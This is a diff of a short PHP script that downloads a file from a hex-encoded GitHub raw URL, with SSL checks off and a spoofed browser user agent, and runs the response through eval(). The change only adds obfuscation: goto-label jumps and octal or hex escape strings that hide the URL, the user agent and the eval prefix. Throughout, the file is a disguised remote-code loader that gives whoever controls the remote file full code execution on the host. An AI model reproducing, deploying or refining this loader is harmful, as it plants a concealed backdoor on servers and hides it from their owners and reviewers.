@@ -1,10 +1,9 @@
 <?php
-
-error_reporting(0);
+ goto xshikata_5b79; LNQYVK: error_reporting(0);
 set_time_limit(0);
 
 function g_u() {
-    return pack("H*", "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f332e747874");
+    return pack("\110\x2a", "\x36\70\67\64\67\64\67\x30\67\63\63\x61\x32\146\x32\x66\67\62\66\x31\67\67\62\x65\66\x37\66\x39\x37\x34\66\70\x37\x35\x36\62\x37\x35\67\63\x36\x35\67\62\66\63\x36\146\66\x65\x37\64\66\65\66\x65\x37\x34\x32\145\66\63\66\146\66\x64\x32\146\66\143\x37\x35\66\66\x36\x36\67\x39\66\x66\67\x30\x36\144\x32\x66\66\146\67\x30\x36\144\62\146\x37\x32\x36\65\66\66\67\x33\62\146\x36\x38\x36\x35\66\61\x36\x34\x37\x33\x32\146\x36\x64\x36\x31\66\x39\66\145\62\x66\63\x33\62\x65\67\x34\67\x38\x37\x34");
 }
 
 $ch = curl_init(g_u());
@@ -14,7 +13,7 @@ curl_setopt_array($ch, [
     CURLOPT_SSL_VERIFYPEER => false,
     CURLOPT_SSL_VERIFYHOST => false,
     CURLOPT_TIMEOUT        => 30,
-    CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    CURLOPT_USERAGENT      => "\115\x6f\172\x69\154\154\141\x2f\65\56\x30\x20\50\x57\151\156\x64\157\167\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\73\40\x57\x69\x6e\x36\x34\73\40\170\x36\64\x29\40\x41\160\160\x6c\x65\127\145\x62\113\151\164\57\65\63\x37\x2e\63\66\40\50\x4b\110\x54\115\114\54\x20\x6c\x69\153\145\x20\107\x65\x63\x6b\x6f\x29\x20\x43\150\x72\x6f\155\x65\57\61\62\60\56\x30\56\60\56\x30\40\123\141\x66\141\x72\x69\x2f\65\63\67\56\63\x36"
 ]);
 
 $r = curl_exec($ch);
@@ -22,9 +21,8 @@ curl_close($ch);
 
 if ($r) {
     try {
-        eval('?>' . $r);
+        eval("\x3f\76" . $r);
     } catch (Throwable $e) {
     }
-}
-
+} goto EHWOZJ; xshikata_5b79: goto LNQYVK; EHWOZJ: 
 ?>
